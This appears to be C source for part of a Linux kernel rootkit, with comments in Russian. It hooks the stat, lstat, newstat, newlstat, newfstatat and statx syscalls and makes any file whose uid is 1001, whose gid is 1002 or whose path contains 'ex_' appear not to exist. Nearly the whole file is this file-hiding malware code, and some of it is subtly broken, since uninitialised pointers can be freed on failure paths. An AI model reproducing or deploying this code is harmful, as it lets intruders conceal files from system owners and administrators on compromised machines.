/*
    скрывает по uid gid и подстроке
    не скрывает по pid (это что?)
*/

bool copy_file_stat(struct stat *statbuf, struct stat **kstatbuf);
bool copy_file_statx(struct statx *statxbuf, struct statx **kstatxbuf);
bool copy_filepath(char *filepath, char **kfilepath);
bool is_hide_uid(unsigned int file_uid);
bool is_hide_gid(unsigned int file_gid);
bool is_hide_file(unsigned int file_uid, unsigned int file_gid, char *kfilepath);
void free_bufs(void *first, void *second);

/*
    copy_file_stat - функция, копирует stat файла в пространство ядра

    struct stat *statbuf   - указатель на пространство пользователя
    struct stat **kstatbuf - указатель на указатель на пространство ядра
*/
bool copy_file_stat(struct stat *statbuf, struct stat **kstatbuf) {
    *kstatbuf = kzalloc(sizeof(struct stat), GFP_KERNEL);
    if (*kstatbuf == NULL) {
        return false;
    }

    if (copy_from_user(*kstatbuf, statbuf, sizeof(struct stat))) {
        return false;
    }

    return true;
}

/*
    copy_file_stat - функция, копирует statx файла в пространство ядра

    struct statx *statxbuf   - указатель на пространство пользователя
    struct statx **kstatxbuf - указатель на указатель на пространство ядра
*/
bool copy_file_statx(struct statx *statxbuf, struct statx **kstatxbuf) {
    *kstatxbuf = kzalloc(sizeof(struct statx), GFP_KERNEL);
    if (*kstatxbuf == NULL) {
        return false;
    }

    if (copy_from_user(*kstatxbuf, statxbuf, sizeof(struct statx))) {
        return false;
    }

    return true;
}

/*
    copy_file_stat - функция, копирует путь файла в пространство ядра

    char *filepath   - указатель на пространство пользователя
    char **kfilepath - указатель на указатель на пространство ядра
*/
bool copy_filepath(char *filepath, char **kfilepath) {
    size_t filepath_len = strnlen_user(filepath, PATH_MAX);
    if (filepath_len == 0 || filepath_len > PATH_MAX) { 
        return false;
    }

    *kfilepath = kzalloc(filepath_len, GFP_KERNEL);
    if (*kfilepath == NULL) {
        return false;
    }

    if (copy_from_user(*kfilepath, filepath, filepath_len)) {
        return false;
    }

    (*kfilepath)[filepath_len - 1] = '\0'; 

    return true;
}

unsigned int uids[] = {1001};
unsigned int gids[] = {1002};
struct Extended_array ea_uids = {uids, sizeof(uids) / sizeof(uids[0])};
struct Extended_array ea_gids = {gids, sizeof(gids) / sizeof(gids[0])};

/*
    is_hide_uid - функция, скрывать или нет файл по uid

    unsigned int file_uid - uid файла
*/
bool is_hide_uid(unsigned int file_uid) {
    for (int uid_id = 0; uid_id < ea_uids.array_size; uid_id++) {
        if (file_uid == ((unsigned int*)ea_uids.array_addr)[uid_id]) {
            return true;
        }    
    }

    return false;
}

/*
    is_hide_gid - функция, скрывать или нет файл по gid

    unsigned int file_gid - gid файла
*/
bool is_hide_gid(unsigned int file_gid) {
    for (int gid_id = 0; gid_id < ea_gids.array_size; gid_id++) {
        if (file_gid == ((unsigned int*)ea_gids.array_addr)[gid_id]) {
            return true;
        }    
    }

    return false;
}

/*
    is_hide_file - функция, скрывать или нет файл по uid, gid, подстроке названия файла

    unsigned int file_uid - uid файла
    unsigned int file_gid - gid файла
    char *kfilepath       - путь до файла файла 
*/
bool is_hide_file(unsigned int file_uid, unsigned int file_gid, char *kfilepath) {
    if (is_hide_uid(file_uid) || is_hide_gid(file_gid) || strstr(kfilepath, "ex_")) {
        return true;
    }

    return false;
}

/*
    free_bufs - функция, освобождать выделенную память

    void *first  - указатель на память
    void *second - указатель на память
*/
void free_bufs(void *first, void *second) {
    if (first) {
        kfree(first);
    }

    if (second) {
        kfree(second);
    }   
}

// ===================== Перехват функций ===============================

static asmlinkage long ex_sys_stat(struct pt_regs *regs)
{
    long ret = real_sys_stat(regs);

    if (ret < 0) {
        return ret;
    }

    char *kfilepath;
    struct stat *kstatbuf;

    if (!copy_file_stat((struct stat *)regs->si, &kstatbuf) ||
        !copy_filepath((char *)regs->di, &kfilepath) ||
        !is_hide_file(kstatbuf->st_uid, kstatbuf->st_gid, kfilepath)) {
        goto out;
    }

    ret = -ENOENT;

out:
    free_bufs(kstatbuf, kfilepath);
    return ret;
}

static asmlinkage long ex_sys_lstat(struct pt_regs *regs)
{
    long ret = real_sys_lstat(regs);

    if (ret < 0) {
        return ret;
    }

    char *kfilepath;
    struct stat *kstatbuf;

    if (!copy_file_stat((struct stat *)regs->si, &kstatbuf) ||
        !copy_filepath((char *)regs->di, &kfilepath) ||
        !is_hide_file(kstatbuf->st_uid, kstatbuf->st_gid, kfilepath)) {
        goto out;
    }

    ret = -ENOENT;

out:
    free_bufs(kstatbuf, kfilepath);
    return ret;
}

static asmlinkage long ex_sys_newstat(struct pt_regs *regs)
{
    long ret = real_sys_newstat(regs);
    
    if (ret < 0) {
        return ret;
    }
    
    char *kfilepath;
    struct stat *kstatbuf;

    if (!copy_file_stat((struct stat *)regs->si, &kstatbuf) ||
        !copy_filepath((char *)regs->di, &kfilepath) ||
        !is_hide_file(kstatbuf->st_uid, kstatbuf->st_gid, kfilepath)) {
        goto out;
    }

    ret = -ENOENT;

out:
    free_bufs(kstatbuf, kfilepath);
    return ret;
}

static asmlinkage long ex_sys_newlstat(struct pt_regs *regs)
{
    long ret = real_sys_newlstat(regs);
    
    if (ret < 0) {
        return ret;
    }
    
    char *kfilepath;
    struct stat *kstatbuf;

    if (!copy_file_stat((struct stat *)regs->si, &kstatbuf) ||
        !copy_filepath((char *)regs->di, &kfilepath) ||
        !is_hide_file(kstatbuf->st_uid, kstatbuf->st_gid, kfilepath)) {
        goto out;
    }

    ret = -ENOENT;

out:
    free_bufs(kstatbuf, kfilepath);
    return ret;
}


static asmlinkage long ex_sys_newfstatat(struct pt_regs *regs)
{
    long ret = real_sys_newfstatat(regs);

    if (ret < 0) {
        return ret;
    }

    char *kfilepath;
    struct stat *kstatbuf;

    if (!copy_file_stat((struct stat *)regs->dx, &kstatbuf) ||
        !copy_filepath((char *)regs->si, &kfilepath) ||
        !is_hide_file(kstatbuf->st_uid, kstatbuf->st_gid, kfilepath)) {
        goto out;
    }

    ret = -ENOENT;

out:
    free_bufs(kstatbuf, kfilepath);
    return ret;
}


static asmlinkage long ex_sys_statx(struct pt_regs *regs)
{
    long ret = real_sys_statx(regs);

    if (ret < 0) {
        return ret;
    }

    char *kfilepath;
    struct statx *kstatxbuf;

    if (!copy_file_statx((struct statx *)regs->r8, &kstatxbuf) ||
        !copy_filepath((char *)regs->si, &kfilepath) ||
        !is_hide_file(kstatxbuf->stx_uid, kstatxbuf->stx_gid, kfilepath)) {
        goto out;
    }

    ret = -ENOENT;

out:
    free_bufs(kstatxbuf, kfilepath);
    return ret;
}

// ======================================================================
